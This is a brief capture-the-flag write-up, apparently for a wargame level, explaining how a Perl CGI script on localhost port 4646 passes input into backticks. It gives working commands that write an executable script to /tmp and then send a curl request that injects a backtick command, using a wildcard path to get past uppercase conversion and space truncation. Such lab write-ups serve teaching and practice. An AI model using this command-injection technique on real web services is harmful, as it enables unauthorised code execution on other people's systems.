the perl scrypt (cat level12.pl) like in lvl 04 executes the contents of file that we provide in arg through 4646 localhost CGI
but now it uses backticks straightforward, capitalizes every letter and deletes evetything after space, so it is more complicated:
echo '#!/bin/bash' > /tmp/SCRYPT
echo 'getflag > /tmp/flag12' >> /tmp/SCRYPT
echo " anything after space" >> /tmp/SCRYPT
chmod +x /tmp/SCRYPT
curl localhost:4646?x='`/*/SCRYPT`' - we use wildcard because any folder name would be capitalized
cat /tmp/flag12
